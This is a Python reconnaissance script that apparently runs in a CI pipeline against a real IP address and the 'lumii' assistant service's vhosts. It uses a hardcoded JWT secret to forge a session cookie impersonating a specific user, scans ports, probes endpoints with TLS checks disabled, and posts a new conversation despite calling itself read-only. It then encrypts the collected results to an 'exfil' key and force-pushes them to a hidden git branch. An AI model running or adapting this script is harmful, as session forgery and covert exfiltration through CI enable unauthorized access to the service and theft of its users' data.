#!/usr/bin/env python3
# recon7 (intent 28278): find a NON-403 path to the lumii assistant backend (device bridge) for Brian's DESKTOP-S9906QK.
# Authorized: in-scope asset 40714/122.51.1.87 + lumii vhosts. Read-only.
import os, sys, json, time, uuid, base64, hmac, hashlib, socket, ssl, subprocess, shutil, traceback
import http.client
_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)
RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
ASST = "asst_E3G6xx8h7Ei279q6ossJ6"
SUB_BRIAN = "usr_j7t9Dhq4M4obQkag5huJi"
OUT = "/tmp/resultsr7"; os.makedirs(OUT, exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n")
    except Exception: pass
def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def jwt_session(sub, org=ORG):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(',', ':')))
    p = b64u(json.dumps({"sub": sub, "org": org, "iat": now, "exp": now + 2592000, "sid": "sid_" + str(uuid.uuid4()), "lgn": now}, separators=(',', ':')))
    sig = hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest()
    return "lumii_session=" + h + "." + p + "." + b64u(sig)
CK = jwt_session(SUB_BRIAN)
CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE

def tcp(ip, port, t=4):
    try:
        s = socket.create_connection((ip, port), timeout=t); s.close(); return True
    except Exception:
        return False

def http_call(scheme, host, port, path, host_header=None, cookie=None, method="GET", data=None, timeout=8):
    try:
        if scheme == "https":
            c = http.client.HTTPSConnection(host, port, timeout=timeout, context=CTX)
        else:
            c = http.client.HTTPConnection(host, port, timeout=timeout)
        headers = {"Accept": "*/*", "User-Agent": "Mozilla/5.0", "Connection": "close"}
        if host_header: headers["Host"] = host_header
        if cookie: headers["Cookie"] = cookie
        body = None
        if data is not None:
            body = json.dumps(data).encode(); headers["Content-Type"] = "application/json"
        c.request(method, path, body=body, headers=headers)
        r = c.getresponse(); b = r.read(); hd = {k.lower(): v for k, v in r.getheaders()}
        c.close()
        return r.status, hd, b
    except Exception as e:
        return -1, {}, ("ERR:" + repr(e)).encode()

def main():
    log("=== recon7 start", RUNID, "===")
    res = {}
    IP = "122.51.1.87"
    ports = [80, 443, 3000, 3001, 4000, 5000, 5173, 7001, 8000, 8080, 8081, 8787, 8788, 8888, 9000, 9090, 10000]
    openp = []
    for p in ports:
        if tcp(IP, p): openp.append(p)
    res["open_ports"] = openp; log("OPEN PORTS", openp)
    # For each open non-443 port, probe /health & /api/health with assistant Host header
    for p in openp:
        if p == 443: continue
        for scheme in ("http", "https"):
            for path in ("/health", "/api/health", "/api/me"):
                st, hd, b = http_call(scheme, IP, p, path, host_header="assistant.lumiiai.cn", cookie=CK)
                if st != -1:
                    key = "%s://%s:%d%s" % (scheme, IP, p, path)
                    res[key] = {"status": st, "len": len(b), "srv": hd.get("server"), "body": b[:200].decode(errors="replace")}
                    log(scheme, "//", IP, p, path, "->", st, "len", len(b), b[:120].decode(errors="replace"))
                    break
            else:
                continue
            break
    # Re-test assistant vhost now (transient?)
    for path in ("/health", "/api/health", "/api/me", "/"):
        st, hd, b = http_call("https", "assistant.lumiiai.cn", 443, path, host_header="assistant.lumiiai.cn", cookie=CK)
        res["assistant " + path] = {"status": st, "len": len(b), "body": b[:200].decode(errors="replace")}
        log("ASSISTANT", path, "->", st, "len", len(b), b[:120].decode(errors="replace"))
    # adient (金年 CENTER) + 124.221.48.52:8080 + cloud-ops
    vhosts = [("adient.lumiiai.cn", 443, "https"), ("124.221.48.52", 8080, "http"), ("cloud-ops.lumiiai.cn", 443, "https")]
    for hh, port, sch in vhosts:
        for path in ("/health", "/api/health", "/api/me", "/api/conversations"):
            if path == "/api/conversations":
                st, hd, b = http_call(sch, hh, port, path, host_header=hh, cookie=CK, method="POST",
                                      data={"title": "r7", "assistantId": ASST, "participants": []})
            else:
                st, hd, b = http_call(sch, hh, port, path, host_header=hh, cookie=CK)
            res["%s %s" % (hh, path)] = {"status": st, "len": len(b), "srv": hd.get("server"), "body": b[:220].decode(errors="replace")}
            log(hh, path, "->", st, "len", len(b), b[:140].decode(errors="replace"))
    with open(os.path.join(OUT, "recon7.json"), "w") as f:
        json.dump(res, f, ensure_ascii=False, indent=1)
    push("r7")

RESULT_BRANCH = os.environ.get("PRESULT_BRANCH", "ci-bridge5-28278-results")
def push(tag):
    enc = "/tmp/resultsr7.tar.gz.gpg"
    try:
        for p in ("/tmp/resultsr7.tar.gz", enc, "resultsr7.tar.gz.gpg"):
            try:
                if os.path.isfile(p): os.remove(p)
            except Exception: pass
        subprocess.run("tar czf /tmp/resultsr7.tar.gz -C /tmp resultsr7", shell=True, check=False)
        if os.path.isfile("pub.asc"):
            subprocess.run("gpg --batch --yes --import pub.asc >/dev/null 2>&1", shell=True, check=False)
            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/resultsr7.tar.gz" % enc, shell=True, capture_output=True, text=True, timeout=300)
        if os.path.isfile(enc):
            shutil.copy(enc, "resultsr7.tar.gz.gpg")
            subprocess.run('git config user.email ci@aro.network; git config user.name ci', shell=True, check=False)
            subprocess.run("git add -f resultsr7.tar.gz.gpg && git commit -m 'ci recon7 %s %s' || true" % (RUNID, tag), shell=True, check=False)
            r = subprocess.run("git push -f origin HEAD:refs/heads/%s" % RESULT_BRANCH, shell=True, capture_output=True, text=True, timeout=600)
            log("PUSH rc=%s err=%s" % (r.returncode, (r.stderr or "")[-160:]))
    except Exception as e:
        log("PUSH EXC", repr(e))
try:
    main()
except Exception:
    log("FATAL", traceback.format_exc())
    try: push("fatal")
    except Exception: pass
sys.exit(1)
